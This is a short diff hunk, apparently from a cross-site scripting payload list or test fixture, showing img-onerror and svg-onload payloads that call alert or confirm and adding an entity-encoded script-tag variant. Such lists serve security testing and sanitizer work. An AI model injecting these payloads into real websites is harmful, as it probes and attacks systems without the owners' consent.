@@ -7,3 +7,4 @@
 <img src=xss onerror=alert(1)>
 <svg onload=alert(1)>
 <svg onload=confirm(1)>
+&lt;script&gt;alert(1)&lt;/script&gt;
